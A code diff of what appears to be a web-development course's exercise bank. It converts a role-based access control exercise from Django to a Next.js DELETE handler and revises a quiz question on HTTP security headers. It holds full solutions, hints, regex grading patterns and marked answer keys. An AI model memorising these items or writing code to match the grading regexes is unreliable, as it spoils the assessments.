-# from .serializers import ArticleSerializer`,
+type Role = "admin" | "editor" | "viewer";
+`,
     testCases: [
-      {
-        input: 'Admin user sends DELETE request',
-        expectedOutput: 'has_permission returns True',
-        description: 'Admin should have full access including DELETE',
-      },
-      {
-        input: 'Editor user sends DELETE request',
-        expectedOutput: 'has_permission returns False',
-        description: 'Editor should be denied DELETE access',
-      },
-      {
-        input: 'Viewer user sends POST request',
-        expectedOutput: 'has_permission returns False',
-        description: 'Viewer should only have read access',
-      },
-      {
-        input: 'Unauthenticated request',
-        expectedOutput: 'has_permission returns False',
-        description: 'Unauthenticated users should be denied all access',
-      },
+      { input: 'DELETE with no session', expectedOutput: '401', description: 'No session means not authenticated' },
+      { input: 'DELETE as an editor', expectedOutput: '403', description: 'An editor is known but not allowed to delete' },
+      { input: 'DELETE as an admin', expectedOutput: '204, the article is deleted', description: 'An admin may delete' },
     ],
-    solution: `from rest_framework.permissions import BasePermission
-from rest_framework import viewsets
-from rest_framework.decorators import action
+    solution: `// app/api/articles/[id]/route.ts
+import { auth } from "@/auth";
+import { prisma } from "@/lib/prisma";
 
-ROLE_PERMISSIONS = {
-    'admin': ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS'],
-    'editor': ['GET', 'POST', 'PUT', 'PATCH', 'HEAD', 'OPTIONS'],
-    'viewer': ['GET', 'HEAD', 'OPTIONS'],
+type Role = "admin" | "editor" | "viewer";
+
+const ROLE_METHODS: Record<Role, string[]> = {
+  admin: ["GET", "PUT", "DELETE"],
+  editor: ["GET", "PUT"],
+  viewer: ["GET"],
+};
+
+function can(role: Role, method: string): boolean {
+  return ROLE_METHODS[role]?.includes(method) ?? false;
 }
 
-
-class RoleBasedPermission(BasePermission):
-    message = 'You do not have permission to perform this action.'
-
-    def has_permission(self, request, view):
-        if not request.user or not request.user.is_authenticated:
-            return False
-
-        user_role = getattr(request.user, 'role', None)
-        if not user_role:
-            return False
-
-        allowed_methods = ROLE_PERMISSIONS.get(user_role, [])
-        return request.method in allowed_methods
-
-
-class ArticleViewSet(viewsets.ModelViewSet):
-    permission_classes = [RoleBasedPermission]
-    # queryset = Article.objects.all()
-    # serializer_class = ArticleSerializer`,
-    explanation: 'RBAC (Role-Based Access Control) assigns permissions based on roles rather than individual users. This is more maintainable than per-user permissions as your app scales. The permission class checks: (1) Is the user authenticated? (2) What role do they have? (3) Is the HTTP method allowed for that role? DRF calls has_permission() before the view executes. If it returns False, DRF returns a 403 Forbidden response. The ROLE_PERMISSIONS dict makes it easy to modify access levels without changing code logic. For more granular control, override has_object_permission() to check if a user can access a SPECIFIC object (e.g., editors can only edit their own articles). DRF\'s built-in IsAdminUser only checks is_staff, which is too coarse for most apps. Custom permissions give you the flexibility to implement your exact business rules. In production, consider django-guardian for object-level permissions or django-rules for predicate-based permissions.',
+export async function DELETE(
+  _req: Request,
+  { params }: { params: Promise<{ id: string }> },
+) {
+  const session = await auth();
+  if (!session) return new Response(null, { status: 401 });
+  if (!can(session.user.role, "DELETE")) return new Response(null, { status: 403 });
+  const { id } = await params;
+  await prisma.article.delete({ where: { id } });
+  return new Response(null, { status: 204 });
+}`,
+    explanation: `Role-based access control (RBAC) gives permissions to roles rather than to individual users, and a table from role to allowed methods keeps those rules in one place: changing what editors may do is one line, not a hunt through handlers. The DELETE handler checks in the order the api_design rule card gives the status codes: no session is 401 (the server does not know who you are), a session whose role may not delete is 403 (it knows you, and the answer is no), and only then does it touch the database, answering 204 with no body. Both checks run before the delete, on the server, because hiding the Delete button in the UI stops nobody who calls the API directly. The ?? false in can() covers a role that is missing from the table. A finer rule, such as "editors may change only their own articles", needs the article itself: load it and compare its authorId with session.user.id before writing. Django REST Framework expresses the same check as a permission class with has_permission().`,
     tieredHints: {
-      apiSignature: 'BasePermission.has_permission(request: Request, view: View) -> bool',
-      skeleton: `class RoleBasedPermission(BasePermission):
-    def has_permission(self, request, view):
-        if not request.user or not request.user.____:
-            return False
-
-        user_role = getattr(request.user, '____', None)
-        if not user_role:
-            return False
-
-        allowed_methods = ROLE_PERMISSIONS.get(user_role, [])
-        return request.method in ____`,
+      apiSignature: 'auth(): Promise<Session | null>; new Response(null, { status })',
+      skeleton: `export async function DELETE(_req: Request, { params }: { params: Promise<{ id: string }> }) {
+  const session = await ____;
+  if (____) return new Response(null, { status: ____ });
+  if (!can(____, ____)) return new Response(null, { status: ____ });
+  const { id } = ____;
+  // delete, then answer with no body
+}`,
     },
     hints: [
-      'BasePermission requires implementing has_permission(self, request, view)',
-      'Check request.method against allowed methods for the user\'s role',
-      'Always check is_authenticated first -- anonymous users have no role',
+      'No session is 401; a session without permission is 403',
+      'Check both before calling prisma.article.delete',
+      'params is a promise in Next.js 15: await it to read id',
     ],
-    tags: ['rbac', 'permissions', 'drf', 'authorization', 'security'],
-    concepts: ['web-security-auth-tokens', 'web-security-input-validation'],
+    tags: [
+      'rbac',
+      'authorization',
+      'route-handler',
+      'nextjs',
+      'security',
+    ],
+    concepts: [
+      'web-security-auth-tokens',
+    ],
+    requires: [
+      /editor["']?\s*:\s*\[(?![^\]]*DELETE)[^\]]*PUT[^\]]*\]/,
+      /viewer["']?\s*:\s*\[\s*["']GET["']\s*\]/,
+      /await\s+auth\(\)/,
+      /await\s+params/,
+      /\b401\b[\s\S]*\b403\b[\s\S]*\.delete\(/,
+      /status:\s*204/,
+    ],
   },
 
   {
@@ -952,17 +961,17 @@ class ArticleViewSet(viewsets.ModelViewSet):
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.PATTERNS_ARCHITECTURAL,
     course: Course.WEB_DEV,
-    question: 'Your Django app is deployed and you want to add security headers. Which combination of headers and their purposes is correct?',
+    question: `You deploy a Next.js app and add four security headers to every response from the headers() function in next.config.ts: X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Strict-Transport-Security: max-age=31536000, and Referrer-Policy: strict-origin-when-cross-origin. Which description of what they do is correct?`,
     options: [
-      { id: 'a', text: 'X-Content-Type-Options forces all responses to be JSON. X-Frame-Options allows only trusted iframes. Strict-Transport-Security enables HTTP/2. Referrer-Policy hides the Referer header from your own server logs.', isCorrect: false },
-      { id: 'b', text: 'These headers are only needed for APIs, not for frontend pages. Django\'s SecurityMiddleware only works with Django templates, not with a separate Next.js frontend.', isCorrect: false },
-      { id: 'c', text: 'X-Content-Type-Options: nosniff (prevents browsers from MIME-sniffing a response to a different content type, stopping attacks where a .jpg is actually executable JS). X-Frame-Options: DENY (blocks your site from being embedded in iframes, preventing clickjacking). Strict-Transport-Security: max-age=31536000 (tells browsers to ONLY use HTTPS for your domain for 1 year, even if user types http://). Referrer-Policy: same-origin (prevents leaking full URLs to third-party sites). Django\'s SecurityMiddleware sets most of these.', isCorrect: true },
-      { id: 'd', text: 'X-Content-Type-Options encrypts the content type. X-Frame-Options is deprecated in favor of CSP. Strict-Transport-Security downgrades gracefully to HTTP. Referrer-Policy only applies to anchor tags.', isCorrect: false },
+      { id: 'a', text: 'nosniff forces every response to be JSON; DENY lets only trusted sites frame the page; HSTS turns on HTTP/2; Referrer-Policy hides referrers from your own logs', isCorrect: false },
+      { id: 'b', text: 'nosniff encrypts the Content-Type header; DENY is ignored by modern browsers; HSTS falls back to HTTP if HTTPS fails; Referrer-Policy covers only <a> links', isCorrect: false },
+      { id: 'c', text: 'nosniff stops browsers guessing a file\'s type; DENY blocks other sites from framing the page; HSTS makes browsers use only HTTPS; Referrer-Policy limits leaked URLs', isCorrect: true },
+      { id: 'd', text: 'They matter only for API routes: pages rendered by React escape their output, so nosniff, DENY, HSTS and Referrer-Policy add nothing to them', isCorrect: false },
     ],
-    explanation: 'Security headers are a critical defense layer that costs almost nothing to implement. X-Content-Type-Options: nosniff -- Without this, browsers may "sniff" content types. An attacker could upload a file named image.jpg that actually contains JavaScript. The browser might detect it\'s JS and execute it. "nosniff" forces the browser to trust the Content-Type header. X-Frame-Options: DENY -- Clickjacking attack: attacker loads your site in a transparent iframe, overlays it on their page, and tricks users into clicking your buttons (like "Delete Account"). DENY prevents your site from being framed entirely. SAMEORIGIN allows framing only by your own domain. Strict-Transport-Security (HSTS) -- After the first HTTPS visit, the browser will ALWAYS use HTTPS for your domain, even if the user types http:// or clicks an http:// link. This prevents SSL-stripping MITM attacks. Referrer-Policy: same-origin -- When users click links to external sites, the Referer header can leak private URLs (e.g., /admin/users/123/edit). "same-origin" only sends the Referer to your own domain. In Django, enable SecurityMiddleware and set: SECURE_BROWSER_XSS_FILTER, SECURE_CONTENT_TYPE_NOSNIFF, X_FRAME_OPTIONS, SECURE_HSTS_SECONDS, SECURE_HSTS_INCLUDE_SUBDOMAINS.',
+    explanation: `Each header closes a different hole. X-Content-Type-Options: nosniff makes the browser trust the Content-Type header instead of guessing, so an uploaded "image" that really contains JavaScript is not run as a script. X-Frame-Options: DENY stops other sites from loading your pages in an iframe, which blocks clickjacking (an invisible frame over a decoy button); the modern equivalent is CSP's frame-ancestors 'none', and sending both is common. Strict-Transport-Security (HSTS) tells the browser to use only HTTPS for your domain for max-age seconds (here a year), even if the user types http://, which defeats SSL-stripping attacks. Referrer-Policy: strict-origin-when-cross-origin sends only your origin, not the full path, to other sites, so private URLs such as /admin/users/123/edit do not leak. React's escaping protects against XSS in markup; it does nothing about framing, MIME sniffing or plain-HTTP downgrades, so pages need these headers as much as APIs do.`,
     hints: [
-      'Each header addresses a different attack vector -- they work together as defense-in-depth',
-      'Django\'s SecurityMiddleware can set most of these with simple settings',
+      'Each header addresses a different attack: MIME sniffing, clickjacking, HTTPS downgrade, URL leaks',
+      'Does React\'s escaping stop another site from putting your page in an iframe?',
     ],
     tags: ['security-headers', 'hsts', 'clickjacking', 'x-frame-options', 'django'],
     concepts: ['web-security-xss'],
